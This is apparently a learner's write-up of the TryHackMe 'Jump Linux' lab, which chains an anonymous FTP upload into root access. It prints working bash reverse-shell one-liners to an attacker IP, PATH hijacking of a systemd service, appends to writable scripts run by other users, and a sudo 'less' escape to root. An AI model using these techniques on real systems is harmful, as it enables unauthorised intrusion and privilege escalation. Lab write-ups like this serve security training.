### JUMP LINUX

# Platform : TryHackMe

# Write up

I scanned the machine using nmap

```bash
└─$ nmap -sV 10.129.171.169
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-13 02:09 -0800
Nmap scan report for 10.129.171.169
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.58 seconds
```

I tried an anonymous ftp connection. Within the /pub directory I retrieved the README.txt file, revealing important information.

```bash
└─$ cat README.txt 
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

I first looked to know which files would be processed. I created a .sh file that would ping back to my machine. I sniffed my network thanks to wireshark to see incoming packets from the target IP. This method allowed me to know that .sh format were processed. I uploaded a reverse shell in /incoming and waited for it to be processed.

```bash
└─$ cat shell.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.135.4/10000 0>&1
└─$ ftp -a 10.129.171.169
Connected to 10.129.171.169.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ./incoming
250 Directory successfully changed.
ftp> put shell.sh
local: shell.sh remote: shell.sh
229 Entering Extended Passive Mode (|||39050|)
150 Ok to send data.
100% |*************************************************************************************************************************************************************************************************|    58        0.98 MiB/s    00:00 ETA
226 Transfer complete.
58 bytes sent in 00:00 (1.41 KiB/s)
ftp> exit
221 Goodbye.
```

I retrieved the first flag.

```bash
└─$ nc -lvnp 10000
Listening on 0.0.0.0 10000
Connection received on 10.129.171.169 41924
bash: cannot set terminal process group (1264): Inappropriate ioctl for device
bash: no job control in this shell
recon_user@tryhackme-2404:~$ cat flag.txt
[REDACTED]
```

I tried to retrieve the flag of the next user (dev_user).

```bash
recon_user@tryhackme-2404:/home/dev_user$ cd ../recon_user
cd ../recon_user
recon_user@tryhackme-2404:/home/dev_user$ cat flag.txt
[REDACTED]
```

I then checked processes using pspy64. I launched a local python server on my device...

```bash
└─$ python3 -m http.server 8000           
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

...and then I retrieved the file on the target machine. I gave him execution rights and started it.

```bash
recon_user@tryhackme-2404:/home/dev_user$ cd ../recon_user
cd ../recon_user
recon_user@tryhackme-2404:~$ curl -O http://192.168.135.4:8000/pspy64
curl -O http://192.168.135.4:8000/pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  4461k      0 --:--:-- --:--:-- --:--:-- 4458k
recon_user@tryhackme-2404:~$ chmod +x pspy64
chmod +x pspy64
recon_user@tryhackme-2404:~$ timeout 3m ./pspy64
timeout 3m ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/11/13 10:14:29 CMD: UID=1001  PID=1474   | ./pspy64 
2026/11/13 10:14:29 CMD: UID=1001  PID=1473   | timeout 3m ./pspy64 
2026/11/13 10:14:29 CMD: UID=1003  PID=1472   | sleep 5 
[...]
2026/11/13 10:14:29 CMD: UID=0     PID=1      | /sbin/init 
2026/11/13 10:14:30 CMD: UID=0     PID=1483   | /usr/lib/systemd/systemd-executor --deserialize 43 --log-level info --log-target journal-or-kmsg 
2026/11/13 10:14:31 CMD: UID=1003  PID=1485   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:31 CMD: UID=1003  PID=1484   | ps aux 
2026/11/13 10:14:31 CMD: UID=1003  PID=1486   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:36 CMD: UID=1003  PID=1488   | grep -v grep 
2026/11/13 10:14:36 CMD: UID=1003  PID=1487   | ps aux 
2026/11/13 10:14:36 CMD: UID=1003  PID=1489   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:41 CMD: UID=1003  PID=1491   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:41 CMD: UID=1003  PID=1490   | ps aux 
2026/11/13 10:14:41 CMD: UID=1003  PID=1492   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:46 CMD: UID=1003  PID=1493   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:46 CMD: UID=1003  PID=1494   | grep -v grep 
2026/11/13 10:14:46 CMD: UID=1003  PID=1495   | 
2026/11/13 10:14:51 CMD: UID=1003  PID=1496   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:51 CMD: UID=1003  PID=1497   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:51 CMD: UID=1003  PID=1498   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:56 CMD: UID=1003  PID=1500   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:56 CMD: UID=1003  PID=1499   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:56 CMD: UID=1003  PID=1501   | /bin/bash /usr/local/bin/healthcheck 
2026/11/13 10:14:57 CMD: UID=0     PID=1502   | ps -e -o pid,ppid,state,command 
2026/11/13 10:15:00 CMD: UID=0     PID=1503   | /sbin/init 
[...]
2026/11/13 10:15:01 CMD: UID=1002  PID=1512   | /bin/bash /opt/dev/backup.sh 
2026/11/13 10:15:01 CMD: UID=1002  PID=1514   | /bin/bash /opt/dev/backup.sh 
2026/11/13 10:15:01 CMD: UID=0     PID=1513   | /bin/sh -c command -v debian-sa1 > /dev/null && debian-sa1 1 1 
2026/11/13 10:15:01 CMD: UID=1002  PID=1515   | tar -czf /tmp/recon_backup.tgz /home/recon_user 
[...]
```

From the output, the /usr/local/bin/healthcheck is often processed. It seems interesting so I looked at it.

```bash
recon_user@tryhackme-2404:~$ cat /usr/local/bin/healthcheck
cat /usr/local/bin/healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

The process doesn't use absolute path for commands such as ps, grep or sleep, which means we may use PATH Hijacking. I looked if the file was a service created by the system.

```bash
recon_user@tryhackme-2404:~$ systemctl list-units --type=service | grep "healthcheck"
<mctl list-units --type=service | grep "healthcheck"
  healthcheck.service                            loaded active running System Health Check
```

healthcheck.service proves it's a service launched by the system. We want now to retrieve the location of the configuration file for this service.

```bash
recon_user@tryhackme-2404:~$ systemctl status healthcheck.service
systemctl status healthcheck.service
● healthcheck.service - System Health Check
     Loaded: loaded (/etc/systemd/system/healthcheck.service; static)
     Active: active (running) since Fri 2026-11-13 10:08:44 UTC; 9min ago
TriggeredBy: ● healthcheck.timer
   Main PID: 603 (healthcheck)
      Tasks: 2 (limit: 1094)
     Memory: 1.9M (peak: 3.7M)
        CPU: 2.865s
     CGroup: /system.slice/healthcheck.service
             ├─ 603 /bin/bash /usr/local/bin/healthcheck
             └─1689 sleep 5
```

The line Loaded: loaded (/etc/systemd/system/healthcheck.service; static) indicates that the config file is located here : /etc/systemd/system/healthcheck.service. Let's look at it :

```bash
recon_user@tryhackme-2404:~$ cat /etc/systemd/system/healthcheck.service
cat /etc/systemd/system/healthcheck.service
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The environment variable PATH indicate that it look for commands firstly in the /opt/dev/bin directory, then /usr/local/bin directory and then in the last one. If a command file is found in the first one, it stops looking for command file in another directory. That's a PATH Hijacking. Let's create a file named ps, that creates a reverse shell.

```bash
recon_user@tryhackme-2404:~$ echo "#!/bin/bash" > /opt/dev/bin/ps
echo "#!/bin/bash" > /opt/dev/bin/ps
recon_user@tryhackme-2404:~$ echo "setsid bash -i >& /dev/tcp/192.168.135.4/9999 0>&1" >> /opt/dev/bin/ps
<dev/tcp/192.168.135.4/9999 0>&1" >> /opt/dev/bin/ps
recon_user@tryhackme-2404:~$ cat /opt/dev/bin/ps
cat /opt/dev/bin/ps
#!/bin/bash
setsid bash -i >& /dev/tcp/192.168.135.4/9999 0>&1
```

I tried to give the file execution rights but my user couldn't.

```bash
recon_user@tryhackme-2404:~$ chmod +x /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
chmod: changing permissions of '/opt/dev/bin/ps': Operation not permitted
```

If we look closely to the pspy64's output, there's another process that is often called, the /opt/dev/backup.sh. I cated its content.

```bash
recon_user@tryhackme-2404:~$ cat /opt/dev/backup.sh
cat /opt/dev/backup.sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
recon_user@tryhackme-2404:~$ ls -la /opt/dev/backup.sh
ls -la /opt/dev/backup.sh
-rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 /opt/dev/backup.sh
recon_user@tryhackme-2404:~$ echo "bash -i >& /dev/tcp/192.168.135.4/8888 0>&1" >> /opt/dev/backup.sh
</tcp/192.168.135.4/8888 0>&1" >> /opt/dev/backup.sh
```

As demonstrated, we can modify this file, even though it's executed by another user. So I added a reverse shell in it and created a listener waiting for incoming connection. After gaining access to this new user (dev_user), I wanted to abuse the PATH Hijacking we previously discovered. I changed the owner of the ps file and tried to give it execution rights, which succeeded ! 

```bash
└─$ nc -lvnp 8888 
Listening on 0.0.0.0 8888
Connection received on 10.129.171.169 55070
bash: cannot set terminal process group (1873): Inappropriate ioctl for device
bash: no job control in this shell
dev_user@tryhackme-2404:~$ chown dev_user /opt/dev/bin/ps
chown dev_user /opt/dev/bin/ps
dev_user@tryhackme-2404:~$ chmod +x /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
dev_user@tryhackme-2404:~$ ls -la /opt/dev/bin/ps
ls -la /opt/dev/bin/ps
-rwxrwxr-x 1 dev_user dev_user 63 Nov 13 10:19 /opt/dev/bin/ps
```

The healthcheck service was processed and it gave me access to a new user, monitor_user. I immediatly retrieved its flag.

```bash
└─$ nc -lvnp 9999 
Listening on 0.0.0.0 9999
Connection received on 10.129.171.169 43954
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
monitor_user@tryhackme-2404:/$ cat /home/monitor_user/flag.txt
[REDACTED]
```

I looked at the sudo commands the user could make. It led to discover editable files, where I added a reverse shell.

```bash
monitor_user@tryhackme-2404:/$ sudo -l 
sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
monitor_user@tryhackme-2404:/$ cat /usr/local/bin/deploy.sh
cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
monitor_user@tryhackme-2404:/$ find / -type f -name deploy_helper.sh 2> /dev/null
< find / -type f -name deploy_helper.sh 2> /dev/null
/opt/app/deploy_helper.sh
monitor_user@tryhackme-2404:/$ cat /opt/app/deploy_helper.sh
cat /opt/app/deploy_helper.sh
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
monitor_user@tryhackme-2404:/$ ls -la /opt/app/deploy_helper.sh
ls -la /opt/app/deploy_helper.sh
-rwxr-xr-x 1 monitor_user monitor_user 90 Feb  2  2026 /opt/app/deploy_helper.sh
monitor_user@tryhackme-2404:/$ echo "setsid bash -i >& /dev/tcp/192.168.135.4/7777 0>&1" >> /opt/app/deploy_helper.sh
<cp/192.168.135.4/7777" >> /opt/app/deploy_helper.sh
```

I launched the sudo command, and waited for the reverse shell to connect back to my listener.

```bash
monitor_user@tryhackme-2404:/$ sudo -u ops_user /usr/local/bin/deploy.sh
sudo -u ops_user /usr/local/bin/deploy.sh
[+] Deploy helper running
[+] Syncing application files
```

I immediatly retrieved the ops_user's flag.

```bash
└─$ nc -lvnp 7777
Listening on 0.0.0.0 7777
Connection received on 10.129.171.169 48802
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
ops_user@tryhackme-2404:/opt/app$ cat /home/ops_user/flag.txt
[REDACTED]
```

I then looked at the sudo commands the user could make. 

```bash
ops_user@tryhackme-2404:/opt/app$ sudo -l
sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

Following gtfobins website commands, we can retrieve a root shell, but first, we need to make the shell to be recognized, otherwise "less" will always close before we can type the shell command in it.

```bash
ops_user@tryhackme-2404:/opt/app$ export TERM=xterm
export TERM=xterm
ops_user@tryhackme-2404:/opt/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now that the shell is recognized, I typed the first command to open a file and in less, I typed the second command (!/bin/bash), that gave me root access.

```bash
ops_user@tryhackme-2404:/opt/app$ sudo /usr/bin/less /etc/hosts   
sudo /usr/bin/less /etc/hosts
# whoami
whoami
root
# cat /root/flag.txt
cat /root/flag.txt
```
